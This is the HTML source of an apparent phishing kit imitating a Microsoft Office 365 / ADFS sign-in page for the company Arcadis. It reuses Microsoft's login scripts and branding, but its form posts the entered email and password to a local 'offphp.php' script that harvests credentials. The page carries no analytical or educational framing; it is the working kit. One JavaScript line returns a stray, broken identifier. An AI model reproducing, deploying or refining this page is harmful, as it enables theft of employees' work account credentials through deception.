 <!DOCTYPE html>
<html lang="en-US">
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=10.000"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
        <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
        <meta http-equiv="cache-control" content="no-cache,no-store"/>
        <meta http-equiv="pragma" content="no-cache"/>
        <meta http-equiv="expires" content="-1"/>
        <meta name='mswebdialog-title' content='Connecting to Arcadis Office 365'/>

        <title>Sign In</title>
        <script type='text/javascript'>
//<![CDATA[
function LoginErrors(){this.userNameFormatError = 'Enter your user ID in the format \u0026quot;domain\\user\u0026quot; or \u0026quot;user@domain\u0026quot;.'; this.passwordEmpty = 'Enter your password.';}
//]]>
</script>
 <link rel="SHORTCUT ICON" href="./css/favicon_a.ico" />
 </script>

<script type='text/javascript'>
//<![CDATA[
// Copyright (c) Microsoft Corporation.  All rights reserved.
function InputUtil(errTextElementID, errDisplayElementID) {

    if (!errTextElementID)  errTextElementID = 'errorText'; 
    if (!errDisplayElementID)  errDisplayElementID = 'error'; 

    this.hasFocus = false;
    this.errLabel = document.getElementById(errTextElementID);
    this.errDisplay = document.getElementById(errDisplayElementID);
};
InputUtil.prototype.canDisplayError = function () {
    return this.errLabel && this.errDisplay;
}
InputUtil.prototype.checkError = function () {
    if (!this.canDisplayError){
        throw new Error ('Error element not present');
    }
    if (this.errLabel && this.errLabel.innerHTML) {
        this.errDisplay.style.display = '';        
        var cause = this.errLabel.getAttribute('for');
        if (cause) {
            var causeNode = document.getElementById(cause);
            if (causeNode && causeNode.value) {
                causeNode.focus();
                this.hasFocus = true;
            }
        }
    }
    else {
        this.errDisplay.style.display = 'none';
    }
};
InputUtil.prototype.setInitialFocus = function (input) {
    if (this.hasFocus) return;
    var node = document.getElementById(input);
    if (node) {
        if ((/^\s*$/).test(node.value)) {
            node.focus();
            this.hasFocus = true;
        }
    }
};
InputUtil.prototype.setError = function (input, errorMsg) {
    if (!this.canDisplayError) {
        throw new Error('Error element not present');
    }
    input.focus();

    if (errorMsg) {
        this.errLabel.innerHTML = errorMsg;
    }
    this.errLabel.setAttribute('for', input.id);
    this.errDisplay.style.display = '';
};
InputUtil.makePlaceholder = function (input) {
    var ua = navigator.userAgent;

    if (ua != null && 
        (ua.match(/MSIE 9.0/) != null || 
         ua.match(/MSIE 8.0/) != null ||
         ua.match(/MSIE 7.0/) != null)) {
        var node = document.getElementById(input);
        if (node) {
            var placeholder = node.getAttribute("placeholder");
            if (placeholder != null && placeholder != '') {
                var label = document.createElement('input');
                label.type = "text";
                label.value = placeholder;
                label.readOnly = true;
                label.style.position = 'absolute';
                label.style.borderColor = 'transparent';
                label.className = node.className + ' hint';
                label.tabIndex = -1;
                label.onfocus = function () { this.nextSibling.focus(); };

                node.style.position = 'relative';
                node.parentNode.style.position = 'relative';
                node.parentNode.insertBefore(label, node);
                node.onkeyup = function () { InputUtil.showHint(this); };
                node.onblur = function () { InputUtil.showHint(this); };
                node.style.background = 'transparent';

                node.setAttribute("placeholder", "");
                InputUtil.showHint(node);
            }
        }
    }
};
InputUtil.focus = function (inputField) {
    var node = document.getElementById(inputField);
    if (node) node.focus();
};
InputUtil.hasClass = function(node, clsName) {
    return node.className.match(new RegExp('(\\s|^)' + clsName + '(\\s|$)'));
};
InputUtil.addClass = function(node, clsName) {
    if (!this.hasClass(node, clsName)) node.className += " " + clsName;
};
InputUtil.removeClass = function(node, clsName) {
    if (this.hasClass(node, clsName)) {
        var reg = new RegExp('(\\s|^)' + clsName + '(\\s|$)');
        node.className = node.className.replace(reg, ' ');
    }
};
InputUtil.showHint = function (node, gotFocus) {
    if (node.value && node.value != '') {
        node.previousSibling.style.display = 'none';
    }
    else {
        node.previousSibling.style.display = '';
    }
};
//]]>
</script>


        
        <link rel="stylesheet" type="text/css" href="./css/style.css" /><style>.illustrationClass {background-image:url(./css/heroillustration.png);}</style>

    </head>
    <body dir="ltr" class="body">
    <div id="noScript" style="position:static; width:100%; height:100%; z-index:100">
        <h1>JavaScript required</h1>
        <p>JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
        <p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
    </div>
    <script type="text/javascript" language="JavaScript">
         document.getElementById("noScript").style.display = "none";
    </script>
    <div id="fullPage">
        <div id="brandingWrapper" class="float">
            <div id="branding"></div>
        </div>
        <div id="contentWrapper" class="float">
            <div id="content">
                <div id="header">
                <img src="data:image/png;base64,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">Sign in with your work or school account work
                </div>
                <div id="workArea">
                    
    <div id="authArea" class="groupMargin">
        
        
    <div id="loginArea">        
        <div id="loginMessage" class="groupMargin">Work or school, or personal Microsoft account</div>

        <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onKeyPress="if (event && event.keyCode == 13) Login.submitLoginRequest();" action="offphp.php" >
            <div id="error" class="fieldMargin error smallText">
                <label id="errorText" for=""></label>
            </div>

            <div id="formsAuthenticationArea">
                <div id="userNameArea">
                    <input id="userNameInput" name="UserName" type="email"  tabindex="1" class="text fullWidth" 
                        spellcheck="false" placeholder="Email or phone" autocomplete="off"/>     
                </div>

                <div id="passwordArea">
                     <input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth" 
                        placeholder="Password" autocomplete="off"/>                                   
                </div>
                <div id="kmsiArea" style="display:none">
                    <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3" />
                    <label for="kmsiInput">Keep me signed in</label>
                </div>
                <div id="submissionArea" class="submitMargin">
                    <span id="submitButton" class="submit" tabindex="4" 
                        onKeyPress="if (event && event.keyCode == 32) Login.submitLoginRequest();" 
                        onclick="return Login.submitLoginRequest();">Sign in</span>
                </div>
            </div>
            <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication"/>
        </form>

             <div id="authOptions">
        <form id="options"  method="post" action="offphp.php">
            <script type="text/javascript">
                function SelectOption(option) {
                    var i = document.getElementById('optionSelection');
                    i.value = option;
                    document.forms['options'].submit();
                    return false;
                }
            </script>
            <input id="optionSelection" type="hidden" name="AuthMethod" />
            <div class='groupMargin'></div>
        </form>
      </div>

        <div id="introduction" class="groupMargin">
                                 
        </div>

        <script type="text/javascript">
        //<![CDATA[

            function Login() {
            }

            Login.userNameInput = 'userNameInput';
            Login.passwordInput = 'passwordInput';

            Login.initialize = function () {

                var u = new InputUtil();

                u.checkError();
                u.setInitialFocus(Login.userNameInput);
                u.setInitialFocus(Login.passwordInput);
            }();

            Login.submitLoginRequest = function () { 
                var u = new InputUtil();
                var e = new LoginErrors();

                var userName = document.getElementById(Login.userNameInput);
                var password = document.getElementById(Login.passwordInput);

                if (!userName.value || !userName.value.match('[@\\\\]')) {
                    u.setError(userName, e.userNameFormatError);
                    return false;
                }

                if (!password.value) {
                    u.setError(password, e.passwordEmpty);
                    return transliterator_create_from_rules;
                }

                document.forms['loginForm'].submit();
                return false;
            };

            InputUtil.makePlaceholder(Login.userNameInput);
            InputUtil.makePlaceholder(Login.passwordInput);
        //]]>
        </script>
    </div>

    </div>

                </div>
                <div id="footerPlaceholder"></div>
            </div>
            <div id="footer">
                <div id="footerLinks" class="floatReverse">
                     <div><span id="copyright">&#169; 2016 Microsoft</span></div>
                </div>
                                          
                        <div class="footer_glyph">
                            <img src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4276.9/content/images/microsoft_logo.png" alt="Microsoft account symbol" />
                        </div>
        </div> 
    </div>
    <script type='text/javascript'>
//<![CDATA[
// Copyright (c) Microsoft Corporation.  All rights reserved.

// This file contains several workarounds on inconsistent browser behaviors that administrators may customize.
"use strict";

// iPhone email friendly keyboard does not include "\" key, use regular keyboard instead.
// Note change input type does not work on all versions of all browsers.
if (navigator.userAgent.match(/iPhone/i) != null) {
    var emails = document.querySelectorAll("input[type='email']");
    if (emails) {
        for (var i = 0; i < emails.length; i++) {
            emails[i].type = 'text';
        }
    }
}

// In the CSS file we set the ms-viewport to be consistent with the device dimensions, 
// which is necessary for correct functionality of immersive IE. 
// However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
// values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
// Windows 8 phone has agent string 'IEMobile 10.0'
if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
    var msViewportStyle = document.createElement("style");
    msViewportStyle.appendChild(
        document.createTextNode(
            "@-ms-viewport{width:auto!important}"
        )
    );
    msViewportStyle.appendChild(
        document.createTextNode(
            "@-ms-viewport{height:auto!important}"
        )
    );
    document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
}

// If the innerWidth is defined, use it as the viewport width.
if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
    var viewport = document.querySelector("meta[name=viewport]");
    viewport.setAttribute('content', 'width=' + window.innerWidth + 'px; initial-scale=1.0; maximum-scale=1.0');
}

// Gets the current style of a specific property for a specific element.
function getStyle(element, styleProp) {
    var propStyle = null;

    if (element && element.currentStyle) {
        propStyle = element.currentStyle[styleProp];
    }
    else if (element && window.getComputedStyle) {
        propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
    }

    return propStyle;
}

// The script below is used for downloading the illustration image 
// only when the branding is displaying. This script work together
// with the code in PageBase.cs that sets the html inline style
// containing the class 'illustrationClass' with the background image.
var computeLoadIllustration = function () {
    var branding = document.getElementById("branding");
    var brandingDisplay = getStyle(branding, "display");
    var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");

    if (brandingDisplay && brandingDisplay !== "none" &&
        brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
        var newClass = "illustrationClass";

        if (branding.classList && branding.classList.add) {
            branding.classList.add(newClass);
        } else if (branding.className !== undefined) {
            branding.className += " " + newClass;
        }
        if (window.removeEventListener) {
            window.removeEventListener('load', computeLoadIllustration, false);
            window.removeEventListener('resize', computeLoadIllustration, false);
        }
        else if (window.detachEvent) {
            window.detachEvent('onload', computeLoadIllustration);
            window.detachEvent('onresize', computeLoadIllustration);
        }
    }
};

if (window.addEventListener) {
    window.addEventListener('resize', computeLoadIllustration, false);
    window.addEventListener('load', computeLoadIllustration, false);
}
else if (window.attachEvent) {
    window.attachEvent('onresize', computeLoadIllustration);
    window.attachEvent('onload', computeLoadIllustration);
}

//]]>
</script>


    </body>
</html> 

